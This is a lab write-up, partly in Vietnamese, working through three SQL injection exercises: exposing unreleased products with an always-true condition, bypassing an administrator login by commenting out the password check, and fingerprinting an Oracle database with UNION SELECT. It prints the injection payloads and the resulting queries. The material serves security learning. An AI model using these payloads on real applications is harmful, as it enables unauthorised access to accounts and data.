# SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data
## Lab Description
![image](Picture/lab1.png)

The query used by the application is provided in the lab description:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
This query retrieves information from the `products` table, specifically selecting products that belong to the `category` with the condition `released = 1`, meaning the products have been released.

To see all products, we need to make this condition `TRUE`.
```sql
Gifts' OR 1=1--
```
The condition `1=1` is always true, and `--` is used to start a comment in SQL, so everything after it is ignored.

# SQL Injection Vulnerability Allowing Login Bypass
## Lab Description
![image](Picture/lab2.png)

The query used in the lab will look something like:
```sql
SELECT * FROM users WHERE username = 'username' AND password = 'password';
```
I try to inject into the username field with `--` to bypass the `AND password = 'password'` condition.

```sql
WHERE username = 'administrator' --
```

This will result in a query like:
```sql
SELECT * FROM users WHERE username = 'administrator' -- ' AND password = '<PASSWORD>'
```
![image](Picture/loginbypass.png)

The final query becomes:
```sql
SELECT * FROM users WHERE username = 'administrator';
```

# SQL injection attack, querying the database type and version on Oracle
## Lab Description
![image](Picture/lab3.png)

Trong `Oracle`, mọi câu lệnh SELECT đều phải có một bảng `FROM`. Và trong `Oracle` có một table có thể được dùng cho mục đích này tên là `dual`
Và có 2 phương pháp khác nhau để truy vấn phiên bản cơ sở dữ liệu trên Oracle.
`SELECT banner FROM v$version`, `SELECT version FROM v$instance`

Để làm được bài tìm được columns chứa string. 
Các bước thực hiện của bài này:
- Đầu tiên xác định số columns của nó bằng cách inject `' ORDER BY 1--` ở đây 1 là số columns, ta tiếp tục tăng lên đến khi bị lỗi và xác định được là có 2 columns.
  ```sql
  SELECT * FROM someTable WHERE category = 'Pets' ORDER BY 2--
  ```
- Tiếp tục kiểm tra cột chứa string bằng `' UNION SELECT 'a','a' FROM DUAL--` ta xác định được 2 columns đều chứa string.
  ```sql
  SELECT * FROM someTable WHERE category = 'Pets' UNION SELECT 'a','a' FROM DUAL--
  ```
- Và cuối cùng để lấy thông tin version inject `' UNION SELECT 'a', banner FROM v$version--`
  ```sql
  SELECT * FROM someTable WHERE category='Pets' UNION SELECT 'a', banner FROM v$version--'
  ```
